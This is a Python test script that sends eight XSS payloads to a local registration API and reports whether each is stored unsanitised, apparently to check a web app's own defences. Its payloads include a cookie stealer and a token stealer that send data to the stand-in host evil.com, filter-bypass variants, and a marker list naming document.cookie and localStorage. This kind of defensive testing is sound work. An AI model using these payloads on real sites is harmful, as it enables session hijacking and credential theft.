"""
simulate_xss.py
Simulates various XSS injection payloads against the registration endpoint.

Usage:
    python scripts/simulate_xss.py

Requirements:
    pip install requests
    npm run dev  (server must be running on localhost:3000)
"""

import requests
import time

REGISTER_URL = "http://localhost:3000/api/auth/register"

PAYLOADS = [
    {
        "label": "Classic <script> tag",
        "name": "<script>alert('XSS')</script>"
    },
    {
        "label": "Image onerror handler",
        "name": "<img src=x onerror=alert(1)>"
    },
    {
        "label": "SVG onload handler",
        "name": "<svg onload=alert(1)>"
    },
    {
        "label": "Anchor javascript: URI",
        "name": "<a href='javascript:alert(1)'>click me</a>"
    },
    {
        "label": "Cookie stealer script",
        "name": "<script>document.location='http://evil.com/?c='+document.cookie</script>"
    },
    {
        "label": "Token stealer via fetch",
        "name": "<script>fetch('http://evil.com/?t='+localStorage.getItem('token'))</script>"
    },
    {
        "label": "HTML entity bypass",
        "name": "&lt;script&gt;alert(1)&lt;/script&gt;"
    },
    {
        "label": "Nested tag bypass",
        "name": "<scr<script>ipt>alert(1)</scr</script>ipt>"
    },
]

DANGEROUS_MARKERS = ["<script", "<img", "onerror", "onload", "javascript:", "document.cookie", "localStorage"]

print("XSS Injection Simulation")
print("=" * 65)

safe_count = 0
vuln_count = 0

for i, payload in enumerate(PAYLOADS, start=1):
    email = f"xss_{i}_{int(time.time())}@simtest.com"
    data  = {
        "email":    email,
        "password": "SimTest1234",
        "name":     payload["name"]
    }

    try:
        r = requests.post(REGISTER_URL, json=data, timeout=5)
    except requests.exceptions.RequestException as e:
        print(f"\n[Test {i}] {payload['label']}")
        print(f"  ERROR: {e}")
        continue

    print(f"\n[Test {i}] {payload['label']}")
    print(f"  Input  : {payload['name']}")

    if r.status_code == 201:
        stored_name = r.json().get("user", {}).get("name", "N/A")
        is_dangerous = any(marker in stored_name for marker in DANGEROUS_MARKERS)

        if is_dangerous:
            vuln_count += 1
            print(f"  Stored : {stored_name}")
            print(f"  Result : VULNERABLE ❌  — dangerous content stored in database!")
        else:
            safe_count += 1
            print(f"  Stored : {stored_name if stored_name else '(empty)'}")
            print(f"  Result : SAFE ✅  — HTML tags stripped, content is harmless")

    elif r.status_code == 400:
        safe_count += 1
        errors = r.json().get("errors", r.json().get("message", ""))
        print(f"  Stored : (rejected — never reached database)")
        print(f"  Result : SAFE ✅  — blocked by validation: {errors}")

    elif r.status_code == 429:
        print(f"  Result : BLOCKED by rate limiter (429) — wait 60s and retry")

    else:
        print(f"  Result : HTTP {r.status_code} — {r.text[:100]}")

    time.sleep(0.2)

print("\n" + "=" * 65)
print(f"FINAL SCORE: {safe_count} safe | {vuln_count} vulnerable")
if vuln_count == 0:
    print("All XSS payloads were neutralised. XSS prevention is WORKING. ✅")
else:
    print(f"WARNING: {vuln_count} payload(s) were stored with dangerous content. ❌")
